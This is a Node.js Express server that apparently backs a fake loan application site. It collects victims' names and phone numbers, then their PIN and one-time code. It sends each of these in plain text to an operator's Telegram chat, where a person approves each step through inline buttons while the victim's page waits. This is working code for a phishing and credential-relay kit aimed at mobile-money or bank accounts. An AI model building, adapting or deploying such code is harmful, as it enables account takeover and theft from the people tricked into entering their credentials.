require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
app.use(cors());
app.use(express.json());

const frontendPath = path.join(__dirname, '../frontend');
app.use(express.static(frontendPath));

app.get('/style.css', (req, res) => {
  res.sendFile(path.join(frontendPath, 'style.css'), {
    headers: { 'Content-Type': 'text/css' }
  });
});

// ─── Config ───
const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// ─── In-memory store ───
const applications = {};
const appRefs = {};
const resendCooldowns = {}; // `${appId}:${step}` -> timestamp (ms)
const RESEND_COOLDOWN_MS = 60 * 1000; // 60 seconds

// ─── Helpers ───
function esc(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function generateAppRef(appId) {
  let ref;
  do {
    ref = Math.random().toString(36).substring(2, 8).toUpperCase();
  } while (appRefs[ref] && appRefs[ref] !== appId);
  appRefs[ref] = appId;
  return ref;
}

function getOrCreateRef(appId) {
  let ref = Object.keys(appRefs).find(k => appRefs[k] === appId);
  if (!ref) ref = generateAppRef(appId);
  return ref;
}

function checkResendCooldown(appId, step) {
  const key = `${appId}:${step}`;
  const last = resendCooldowns[key] || 0;
  const remaining = RESEND_COOLDOWN_MS - (Date.now() - last);
  if (remaining > 0) {
    return { blocked: true, remainingMs: remaining, remainingSec: Math.ceil(remaining / 1000) };
  }
  resendCooldowns[key] = Date.now();
  return { blocked: false };
}

async function sendTelegramMessage(message, buttons = null) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return null;
  const body = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' };
  if (buttons) body.reply_markup = { inline_keyboard: buttons };
  try {
    const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
    const data = await response.json();
    if (!data.ok) {
      console.error('Telegram API error:', data);
      return null;
    }
    console.log('✅ Telegram message sent');
    return data.result.message_id;
  } catch (e) {
    console.error('Telegram send error:', e);
    return null;
  }
}

async function editTelegramMessage(messageId, message, buttons = null) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || !messageId) return;
  const body = {
    chat_id: TELEGRAM_CHAT_ID,
    message_id: messageId,
    text: message,
    parse_mode: 'HTML'
  };
  if (buttons) body.reply_markup = { inline_keyboard: buttons };
  else body.reply_markup = { inline_keyboard: [] };
  try {
    const response = await fetch(`${TELEGRAM_API_URL}/editMessageText`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
    const data = await response.json();
    if (!data.ok && data.description && !data.description.includes('not modified')) {
      console.error('Telegram edit error:', data);
    }
  } catch (e) {
    console.error('Telegram edit error:', e);
  }
}

async function answerCallback(queryId, text) {
  if (!TELEGRAM_BOT_TOKEN) return;
  try {
    await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: queryId, text })
    });
  } catch (e) {
    console.error('answerCallbackQuery error:', e);
  }
}

// ─── API Routes ───
app.get('/api/health', (req, res) => res.json({ ok: true }));

// ─── Submit Application ───
app.post('/api/send-application', async (req, res) => {
  const data = req.body.applicationData;
  if (!data || !data.phone || !data.firstName) {
    return res.status(400).json({ ok: false, error: 'Missing required fields' });
  }

  const appId = `${data.phone}_${Date.now()}`;
  const ref = generateAppRef(appId);

  applications[appId] = {
    ...data,
    appStatus: 'pending',
    pinStatus: 'pending',
    otpStatus: 'pending',
    pinAttempts: 0,
    maxPinAttempts: 3,
    pinBlockedUntil: null,
    telegramMessages: {},
    createdAt: new Date().toISOString()
  };

  const message =
    `🆕 <b>NEW LOAN APPLICATION</b>\n` +
    `ID: <code>${esc(appId)}</code>\n` +
    `Phone: +263${esc(data.phone)}\n` +
    `Amount: $${esc(data.loanAmount)}\n` +
    `Duration: ${esc(data.loanDuration)} days\n` +
    `Name: ${esc(data.firstName)} ${esc(data.lastName)}\n` +
    `Reason: ${esc(data.loanReason || '—')}\n\n` +
    `Approve or reject:`;

  const buttons = [[
    { text: '✅ YES', callback_data: `A|Y|${ref}` },
    { text: '❌ NO',  callback_data: `A|N|${ref}` }
  ]];

  const msgId = await sendTelegramMessage(message, buttons);
  applications[appId].telegramMessages.app = msgId;

  res.json({ ok: true, applicationId: appId, status: 'waiting_app_approval' });
});

// ─── Submit PIN ───
app.post('/api/send-pin', async (req, res) => {
  const { applicationId, pin } = req.body;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

  if (app.appStatus !== 'approved') {
    return res.status(400).json({ ok: false, error: 'Application not yet approved' });
  }

  if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date()) {
    return res.status(429).json({ ok: false, blocked: true, message: 'Too many attempts. Please wait 5 minutes.' });
  }
  if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) <= new Date()) {
    app.pinAttempts = 0;
    app.pinBlockedUntil = null;
  }

  app.pin = pin;
  app.pinStatus = 'pending';

  const ref = getOrCreateRef(applicationId);
  const message =
    `🔐 <b>PIN VERIFICATION</b>\n` +
    `ID: <code>${esc(applicationId)}</code>\n` +
    `PIN Entered: <b>${esc(pin)}</b>\n\n` +
    `Approve or reject:`;

  const buttons = [[
    { text: '✅ YES', callback_data: `P|Y|${ref}` },
    { text: '❌ NO',  callback_data: `P|N|${ref}` }
  ]];

  const msgId = await sendTelegramMessage(message, buttons);
  app.telegramMessages = app.telegramMessages || {};
  app.telegramMessages.pin = msgId;

  res.json({ ok: true, status: 'pending' });
});

// ─── Submit OTP ───
app.post('/api/send-otp', async (req, res) => {
  const { applicationId, otp } = req.body;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

  if (app.pinStatus !== 'approved') {
    return res.status(400).json({ ok: false, error: 'PIN not yet approved' });
  }

  app.otp = otp;
  app.otpStatus = 'pending';

  const ref = getOrCreateRef(applicationId);
  const message =
    `🔢 <b>OTP VERIFICATION</b>\n` +
    `ID: <code>${esc(applicationId)}</code>\n` +
    `OTP Entered: <b>${esc(otp)}</b>\n\n` +
    `Approve or reject:`;

  const buttons = [[
    { text: '✅ YES', callback_data: `O|Y|${ref}` },
    { text: '❌ NO',  callback_data: `O|N|${ref}` }
  ]];

  const msgId = await sendTelegramMessage(message, buttons);
  app.telegramMessages = app.telegramMessages || {};
  app.telegramMessages.otp = msgId;

  res.json({ ok: true, status: 'pending' });
});

// ─── Resend OTP (with cooldown) ───
app.post('/api/resend-otp', async (req, res) => {
  const { applicationId } = req.body;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

  const cd = checkResendCooldown(applicationId, 'otp');
  if (cd.blocked) {
    return res.status(429).json({
      ok: false,
      cooldown: true,
      remainingSec: cd.remainingSec,
      error: `Please wait ${cd.remainingSec}s before resending again.`
    });
  }

  app.otpStatus = 'pending';

  const ref = getOrCreateRef(applicationId);
  const message =
    `🔄 <b>OTP RESENT – ADMIN ACTION REQUIRED</b>\n` +
    `ID: <code>${esc(applicationId)}</code>\n` +
    `New OTP requested.\n\n` +
    `Approve or reject:`;

  const buttons = [[
    { text: '✅ YES', callback_data: `O|Y|${ref}` },
    { text: '❌ NO',  callback_data: `O|N|${ref}` }
  ]];

  const msgId = await sendTelegramMessage(message, buttons);
  app.telegramMessages = app.telegramMessages || {};
  app.telegramMessages.otp = msgId;

  res.json({ ok: true, status: 'otp_resent' });
});

// ─── Resend Application (full refresh, with cooldown) ───
app.post('/api/resend-application/:applicationId', async (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

  const cd = checkResendCooldown(req.params.applicationId, 'app');
  if (cd.blocked) {
    return res.status(429).json({
      ok: false,
      cooldown: true,
      remainingSec: cd.remainingSec,
      error: `Please wait ${cd.remainingSec}s before resending again.`
    });
  }

  const ref = getOrCreateRef(req.params.applicationId);
  const message =
    `🔄 <b>RESENT – LOAN APPLICATION</b>\n` +
    `ID: <code>${esc(req.params.applicationId)}</code>\n` +
    `Phone: +263${esc(app.phone)}\n` +
    `Amount: $${esc(app.loanAmount)}\n` +
    `Duration: ${esc(app.loanDuration)} days\n` +
    `Name: ${esc(app.firstName)} ${esc(app.lastName)}\n` +
    `Reason: ${esc(app.loanReason || '—')}\n` +
    `Current status: <b>${esc(app.appStatus)}</b>\n\n` +
    `Approve or reject:`;

  const buttons = [[
    { text: '✅ YES', callback_data: `A|Y|${ref}` },
    { text: '❌ NO',  callback_data: `A|N|${ref}` }
  ]];

  const msgId = await sendTelegramMessage(message, buttons);
  app.telegramMessages = app.telegramMessages || {};
  app.telegramMessages.app = msgId;

  res.json({ ok: true, status: app.appStatus, messageId: msgId });
});

// ─── Resend current step (with cooldown) ───
app.post('/api/resend-step/:applicationId/:step', async (req, res) => {
  const { applicationId, step } = req.params;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

  const cd = checkResendCooldown(applicationId, step);
  if (cd.blocked) {
    return res.status(429).json({
      ok: false,
      cooldown: true,
      remainingSec: cd.remainingSec,
      error: `Please wait ${cd.remainingSec}s before resending again.`
    });
  }

  const ref = getOrCreateRef(applicationId);
  let message, buttons, statusKey;

  if (step === 'app') {
    message = `🔄 <b>APP step (resend)</b>\nID: <code>${esc(applicationId)}</code>\nAmount: $${esc(app.loanAmount)} / ${esc(app.loanDuration)}d\nStatus: <b>${esc(app.appStatus)}</b>`;
    buttons = [[{ text: '✅ YES', callback_data: `A|Y|${ref}` }, { text: '❌ NO', callback_data: `A|N|${ref}` }]];
    statusKey = 'appStatus';
  } else if (step === 'pin') {
    message = `🔄 <b>PIN step (resend)</b>\nID: <code>${esc(applicationId)}</code>\nPIN: <b>${esc(app.pin || '—')}</b>\nStatus: <b>${esc(app.pinStatus)}</b>`;
    buttons = [[{ text: '✅ YES', callback_data: `P|Y|${ref}` }, { text: '❌ NO', callback_data: `P|N|${ref}` }]];
    statusKey = 'pinStatus';
  } else if (step === 'otp') {
    message = `🔄 <b>OTP step (resend)</b>\nID: <code>${esc(applicationId)}</code>\nOTP: <b>${esc(app.otp || '—')}</b>\nStatus: <b>${esc(app.otpStatus)}</b>`;
    buttons = [[{ text: '✅ YES', callback_data: `O|Y|${ref}` }, { text: '❌ NO', callback_data: `O|N|${ref}` }]];
    statusKey = 'otpStatus';
  } else {
    return res.status(400).json({ ok: false, error: 'Invalid step' });
  }

  const msgId = await sendTelegramMessage(message, buttons);
  app.telegramMessages = app.telegramMessages || {};
  app.telegramMessages[step] = msgId;

  res.json({ ok: true, status: app[statusKey] || 'pending', messageId: msgId });
});

// ─── Reset step (re-approval) ───
app.post('/api/reset-step/:applicationId/:step', async (req, res) => {
  const { applicationId, step } = req.params;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

  if (step === 'app') {
    app.appStatus = 'pending';
  } else if (step === 'pin') {
    app.pinStatus = 'pending';
    app.pinAttempts = 0;
    app.pinBlockedUntil = null;
  } else if (step === 'otp') {
    app.otpStatus = 'pending';
  } else {
    return res.status(400).json({ ok: false, error: 'Invalid step' });
  }

  res.json({ ok: true, status: 'pending' });
});

// ─── Status Polling ───
app.get('/api/status/:applicationId/:step', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

  let status = 'pending';
  let remainingAttempts = null;
  let blocked = false;

  if (req.params.step === 'app') {
    status = app.appStatus;
  } else if (req.params.step === 'pin') {
    status = app.pinStatus;
    remainingAttempts = app.maxPinAttempts - (app.pinAttempts || 0);
    blocked = app.pinStatus === 'blocked' || (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date());
  } else if (req.params.step === 'otp') {
    status = app.otpStatus;
  }

  res.json({ ok: true, status, remainingAttempts, blocked });
});

// ─── Telegram Webhook ───
app.post('/api/telegram-webhook', async (req, res) => {
  const update = req.body;
  console.log('📩 Webhook received');

  if (update.callback_query) {
    const query = update.callback_query;
    const parts = (query.data || '').split('|');
    if (parts.length !== 3) {
      console.error('Invalid callback_data:', query.data);
      await answerCallback(query.id, '⚠️ Invalid data');
      return res.sendStatus(200);
    }

    const [stepCode, actionCode, ref] = parts;
    const stepMap = { A: 'APP', P: 'PIN', O: 'OTP' };
    const s = stepMap[stepCode];
    const a = actionCode === 'Y' ? 'YES' : 'NO';

    const appId = appRefs[ref];
    const app = applications[appId];
    if (!app) {
      console.error(`❌ App not found for ref: ${ref}`);
      await answerCallback(query.id, '⚠️ Application expired or not found');
      return res.sendStatus(200);
    }

    const currentStatus =
      s === 'APP' ? app.appStatus :
      s === 'PIN' ? app.pinStatus :
      app.otpStatus;

    const stepKey = s.toLowerCase();
    const msgId = (app.telegramMessages || {})[stepKey];

    if (currentStatus !== 'pending' && !(s === 'PIN' && a === 'NO')) {
      await answerCallback(query.id, `Already decided: ${currentStatus.toUpperCase()}`);
      await editTelegramMessage(
        msgId,
        `ℹ️ <b>${s} step</b>\nID: <code>${esc(appId)}</code>\nAlready handled: <b>${esc(currentStatus.toUpperCase())}</b>`
      );
      return res.sendStatus(200);
    }

    console.log(`🔘 Processing callback: action=${a}, step=${s}, appId=${appId}`);

    if (s === 'APP') {
      app.appStatus = a === 'YES' ? 'approved' : 'rejected';
    } else if (s === 'PIN') {
      if (a === 'YES') {
        app.pinStatus = 'approved';
      } else {
        app.pinAttempts = (app.pinAttempts || 0) + 1;
        if (app.pinAttempts >= app.maxPinAttempts) {
          app.pinStatus = 'blocked';
          app.pinBlockedUntil = new Date(Date.now() + 5 * 60 * 1000).toISOString();
        } else {
          app.pinStatus = 'rejected';
        }
      }
    } else if (s === 'OTP') {
      app.otpStatus = a === 'YES' ? 'approved' : 'rejected';
    }

    await answerCallback(query.id, `✅ ${a} recorded`);

    const statusText = {
      APP: `App: ${app.appStatus}`,
      PIN: `PIN: ${app.pinStatus}${app.pinStatus === 'rejected' ? ` (attempts ${app.pinAttempts}/${app.maxPinAttempts})` : ''}`,
      OTP: `OTP: ${app.otpStatus}`
    }[s];

    await editTelegramMessage(
      msgId,
      `📋 <b>${s} step decided</b>\nID: <code>${esc(appId)}</code>\nAction: <b>${a}</b>\nStatus: <b>${esc(statusText)}</b>`
    );

    await sendTelegramMessage(`Status Update\nID: ${esc(appId)}\nStep: ${s}\nAction: ${a}\n→ ${esc(statusText)}`);
    return res.sendStatus(200);
  }

  if (update.message && update.message.text) {
    const text = update.message.text.trim();
    const chatId = update.message.chat.id;
    console.log(`💬 Message from ${chatId}: ${text}`);

    if (chatId.toString() === TELEGRAM_CHAT_ID) {
      if (text === '/stats') {
        const total = Object.keys(applications).length;
        const approved = Object.values(applications).filter(a => a.appStatus === 'approved').length;
        const rejected = Object.values(applications).filter(a => a.appStatus === 'rejected').length;
        await sendTelegramMessage(`📊 <b>Stats</b>\nTotal: ${total}\nApproved: ${approved}\nRejected: ${rejected}`);
      } else if (text === '/list') {
        const ids = Object.keys(applications).slice(-5);
        let msg = '📋 <b>Recent applications:</b>\n';
        ids.forEach(id => {
          const app = applications[id];
          msg += `\n<code>${esc(id)}</code>\n  Phone: ${esc(app.phone)}\n  APP: ${app.appStatus} | PIN: ${app.pinStatus} | OTP: ${app.otpStatus}`;
        });
        await sendTelegramMessage(msg || 'No applications yet.');
      } else if (text === '/help') {
        await sendTelegramMessage(
          '<b>Commands</b>\n' +
          '/stats – totals\n' +
          '/list – last 5 applications\n' +
          '/status &lt;id&gt; – full status of an application\n' +
          '/refresh &lt;id&gt; – resend the current step message\n' +
          '/reset &lt;id&gt; &lt;step&gt; – reset step (app|pin|otp) back to pending'
        );
      } else if (text.startsWith('/status ')) {
        const id = text.replace('/status ', '').trim();
        const app = applications[id];
        if (!app) {
          await sendTelegramMessage(`❌ Not found: <code>${esc(id)}</code>`);
        } else {
          await sendTelegramMessage(
            `📄 <b>Status</b>\n` +
            `ID: <code>${esc(id)}</code>\n` +
            `Name: ${esc(app.firstName)} ${esc(app.lastName)}\n` +
            `Phone: +263${esc(app.phone)}\n` +
            `Amount: $${esc(app.loanAmount)} / ${esc(app.loanDuration)}d\n` +
            `APP: <b>${esc(app.appStatus)}</b>\n` +
            `PIN: <b>${esc(app.pinStatus)}</b> (attempts ${app.pinAttempts}/${app.maxPinAttempts})\n` +
            `OTP: <b>${esc(app.otpStatus)}</b>\n` +
            `Created: ${esc(app.createdAt)}`
          );
        }
      } else if (text.startsWith('/refresh ')) {
        const id = text.replace('/refresh ', '').trim();
        const app = applications[id];
        if (!app) {
          await sendTelegramMessage(`❌ Not found: <code>${esc(id)}</code>`);
        } else {
          let step = 'app';
          if (app.appStatus === 'approved' && app.pinStatus === 'pending') step = 'pin';
          else if (app.pinStatus === 'approved' && app.otpStatus === 'pending') step = 'otp';

          const ref = getOrCreateRef(id);
          let message, buttons;
          if (step === 'app') {
            message = `🔄 <b>APP step (refresh)</b>\nID: <code>${esc(id)}</code>\nAmount: $${esc(app.loanAmount)} / ${esc(app.loanDuration)}d\nStatus: <b>${esc(app.appStatus)}</b>`;
            buttons = [[{ text: '✅ YES', callback_data: `A|Y|${ref}` }, { text: '❌ NO', callback_data: `A|N|${ref}` }]];
          } else if (step === 'pin') {
            message = `🔄 <b>PIN step (refresh)</b>\nID: <code>${esc(id)}</code>\nPIN: <b>${esc(app.pin || '—')}</b>\nStatus: <b>${esc(app.pinStatus)}</b>`;
            buttons = [[{ text: '✅ YES', callback_data: `P|Y|${ref}` }, { text: '❌ NO', callback_data: `P|N|${ref}` }]];
          } else {
            message = `🔄 <b>OTP step (refresh)</b>\nID: <code>${esc(id)}</code>\nOTP: <b>${esc(app.otp || '—')}</b>\nStatus: <b>${esc(app.otpStatus)}</b>`;
            buttons = [[{ text: '✅ YES', callback_data: `O|Y|${ref}` }, { text: '❌ NO', callback_data: `O|N|${ref}` }]];
          }
          const msgId = await sendTelegramMessage(message, buttons);
          app.telegramMessages = app.telegramMessages || {};
          app.telegramMessages[step] = msgId;
        }
      } else if (text.startsWith('/reset ')) {
        const parts = text.replace('/reset ', '').trim().split(/\s+/);
        const [id, step] = parts;
        const app = applications[id];
        if (!app) {
          await sendTelegramMessage(`❌ Not found: <code>${esc(id)}</code>`);
        } else if (!['app', 'pin', 'otp'].includes(step)) {
          await sendTelegramMessage('Usage: /reset &lt;id&gt; &lt;app|pin|otp&gt;');
        } else {
          if (step === 'app') app.appStatus = 'pending';
          else if (step === 'pin') { app.pinStatus = 'pending'; app.pinAttempts = 0; app.pinBlockedUntil = null; }
          else app.otpStatus = 'pending';
          await sendTelegramMessage(`♻️ Reset <b>${esc(step)}</b> for <code>${esc(id)}</code> to <b>pending</b>.\nUse /refresh ${esc(id)} to resend.`);
        }
      }
    }
  }

  res.sendStatus(200);
});

app.get('*', (req, res) => {
  res.sendFile(path.join(frontendPath, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
